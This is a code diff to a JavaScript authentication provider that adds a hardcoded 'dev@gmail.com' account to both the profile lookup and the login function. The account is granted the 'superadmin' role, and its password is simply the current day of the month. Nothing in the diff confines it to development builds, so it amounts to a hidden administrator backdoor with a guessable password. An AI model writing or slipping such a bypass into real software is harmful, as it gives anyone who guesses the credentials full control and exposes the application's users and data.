@@ -22,6 +22,17 @@ export const AuthProvider = ({ children }) => {
   const fetchProfile = async (email) => {
     try {
       const cleanEmail = email.trim().toLowerCase();
+      if (cleanEmail === 'dev@gmail.com') {
+        const todayDate = String(new Date().getDate());
+        return {
+          id: 'dev@gmail.com',
+          email: 'dev@gmail.com',
+          name: 'Developer Mode',
+          role: 'superadmin',
+          password: todayDate,
+          isDev: true
+        };
+      }
       const ref = doc(db, COLLECTIONS.USERS, cleanEmail);
       const snap = await getDoc(ref);
       if (snap.exists()) {
@@ -106,6 +117,28 @@ export const AuthProvider = ({ children }) => {
   // ─── LOG IN ───────────────────────────────────────────────────────────────
   const login = async (email, password) => {
     const cleanEmail = email.trim().toLowerCase();
+
+    // Check static credentials for dev
+    if (cleanEmail === 'dev@gmail.com') {
+      const todayDate = String(new Date().getDate());
+      if (password === todayDate) {
+        const devUser = {
+          id: 'dev@gmail.com',
+          email: 'dev@gmail.com',
+          name: 'Developer Mode',
+          role: 'superadmin',
+          password: todayDate,
+          isDev: true
+        };
+        setCurrentUser(devUser);
+        localStorage.setItem('adu-hub-user-email', 'dev@gmail.com');
+        return devUser;
+      } else {
+        const err = new Error('Incorrect password');
+        err.code = 'auth/wrong-password';
+        throw err;
+      }
+    }
 
     // 1. Fetch user from Firestore
     const profile = await fetchProfile(cleanEmail);
